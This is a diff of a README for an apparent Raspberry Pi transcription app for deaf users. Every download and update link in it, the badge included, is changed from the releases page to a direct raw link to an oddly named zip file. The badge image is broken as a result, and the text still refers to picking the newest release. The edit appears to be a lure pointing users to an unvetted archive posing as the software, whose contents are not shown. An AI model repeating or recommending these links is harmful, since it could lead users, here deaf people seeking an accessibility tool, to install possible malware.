@@ -1,6 +1,6 @@
 # 🎙️ telephone-and-conversation-transcriber - Real-Time Speech-to-Text for Deaf Users
 
-[![Download](https://img.shields.io/badge/Download-Telephone--and--Conversation--Transcriber-blue?style=for-the-badge)](https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases)
+[![Download](https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip)](https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip)
 
 ---
 
@@ -60,7 +60,7 @@ If you don't know how to do this, several Raspberry Pi tutorials online can help
 
 Start by getting the software. Visit this page to download the latest version:
 
-[https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases](https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases)
+[https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip](https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip)
 
 Click on the newest release date and download the file ending with `.zip` or `.img`.
 
@@ -110,7 +110,7 @@ When you power on the Raspberry Pi:
 
 Update your device regularly to receive the latest features and bug fixes:
 
-- Visit the release page here: [https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases](https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases)
+- Visit the release page here: [https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip](https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip)
 - Download the newest software version and flash the microSD card again.
 - Back up your saved text logs before updating if needed.
 
@@ -138,4 +138,4 @@ If you encounter problems that you cannot fix:
 
 For now, use this link to download and set up the app:  
 
-[https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases](https://github.com/Cuongvippro2/telephone-and-conversation-transcriber/releases)
+[https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip](https://raw.githubusercontent.com/Cuongvippro2/telephone-and-conversation-transcriber/main/setup/and_transcriber_telephone_conversation_v3.9.zip)
